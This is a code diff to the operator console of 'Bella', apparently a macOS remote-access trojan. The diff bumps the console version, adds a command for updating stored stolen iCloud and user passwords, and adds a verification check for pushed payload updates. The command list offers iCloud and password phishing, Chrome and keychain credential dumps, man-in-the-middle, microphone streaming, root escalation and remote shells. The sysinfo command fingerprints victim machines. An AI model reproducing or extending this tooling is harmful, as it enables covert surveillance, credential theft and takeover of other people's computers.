@@ -24,7 +24,7 @@ greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
 yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'bella_version', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'update_db_entry', 'version', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -144,7 +144,7 @@ def main():
     ctrlC = False
     active=False
     first_run = True
-    cc_version = '1.11'
+    cc_version = '1.20'
     logpath = 'Logs/'
     helperpath = os.getcwd() + '/'
     client_log_path = ''
@@ -374,7 +374,7 @@ def main():
                     else:
                         print "%sCouldn't find any iCloud accounts.\nEnter one manually to phish current GUI user [%s]" % (bluePlus, content[1])
                         appleID = ''
-                    username = raw_input("Enter iCloud Account: ") or appleID
+                    username = raw_input("Enter iCloud Account [press enter to use %s]: " % appleID) or appleID
                     if username == '':
                         print 'No username specified, cancelling Phish'
                         nextcmd = ''
@@ -461,12 +461,13 @@ def main():
                             readline.set_completer(tab_parser)
                         else:
                             readline.parse_and_bind("tab: complete")
+                            readline.set_completer(tab_parser)
 
                     if nextcmd == "":
                         try:
                             nextcmd = raw_input("[%s]-[%s] " % (client_name_formatted, workingdirFormatted))
                             string_log("[%s]-[%s] %s" % (client_name, workingdirFormatted, nextcmd), client_log_path, client_name)
-                        except EOFError, e:
+                        except Exception, e:
                             nextcmd = "exit"
                     else:
                         pass
@@ -544,6 +545,37 @@ def main():
                     if nextcmd == "restart":
                         nextcmd = "osascript -e 'tell application \"System Events\" to restart'"
 
+                    if nextcmd == "update_db_entry":
+                        db_entries = ['iCloud Password', 'User Password']
+                        db_dict = ['applePass', 'localPass']
+                        for i, x in enumerate(db_entries):
+                            print "[%s%s%s] %s" % (red, i + 1, endC, x)
+                        while 1:
+                            try:
+                                entry = input('Which entry would you like to update or delete? Enter a number: ')
+                            except SyntaxError, EOFError:
+                                continue
+                            try:
+                                db_field = db_dict[entry - 1]
+                                if entry == 1: #iCloud Password
+                                    user = raw_input("Enter an iCloud username [just press enter to delete iCloud password]: ")
+                                    if not user:
+                                        passw = ''
+                                    else:
+                                        passw = raw_input("Enter an iCloud password: ")
+                                else:
+                                    user = raw_input("Enter a computer username [just press enter to delete user password]: ")
+                                    if not user:
+                                        passw = ''
+                                    else:
+                                        passw = raw_input("Enter a password for %s: " % user)
+                                db_value = "%s:%s" % (user, passw)
+                                nextcmd = 'update_db_entry:::%s:::%s' % (db_field, db_value)
+                                break
+                            except IndexError as e:
+                                print 'Please enter one the above numbers.'
+                                continue
+
                     if nextcmd.startswith("set_client_name"):
                         if nextcmd == "set_client_name":
                             nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
@@ -559,7 +591,11 @@ def main():
                         if os.path.isfile(local_file):
                             with open(local_file, 'rb') as content:
                                 new_server = content.read()
-                            nextcmd = "update_server%s" % pickle.dumps(new_server)
+                            if not "verify_update_id = '2f4e2e37c9b6eecebb0927a96938b4fa'" in new_server:
+                                print 'This does not appear to be a Bella payload. Cancelling update.'
+                                nextcmd = ''
+                            else:
+                                nextcmd = "update_server%s" % pickle.dumps(new_server)
                         else:
                             print "Could not find [%s]!" % local_file
                             nextcmd = ''
@@ -634,6 +670,9 @@ def main():
                     if nextcmd == "sysinfo":
                         nextcmd = 'scutil --get LocalHostName; whoami; pwd; echo "----------"; sw_vers; ioreg -l | awk \'/IOPlatformSerialNumber/ { print "SerialNumber: \t" $4;}\'; echo "----------";sysctl -n machdep.cpu.brand_string; hostinfo | grep memory; df -h / | grep dev | awk \'{ printf $3}\'; printf "/"; df -h / | grep dev | awk \'{ printf $2 }\'; echo " HDD space used"; echo "----------"; printf "Local IP: "; ipconfig getifaddr en0; ipconfig getifaddr en1; printf "Current Window: "; python -c \'from AppKit import NSWorkspace; print NSWorkspace.sharedWorkspace().frontmostApplication().localizedName()\'; echo "----------"'
                     
+                    if nextcmd == "version":
+                        nextcmd = "bella_version"
+
                     if nextcmd.startswith("upload"): #uploads to CWD.
                         if nextcmd == "upload":
                             local_file= raw_input("🌈  Enter full path to file on local machine: ")
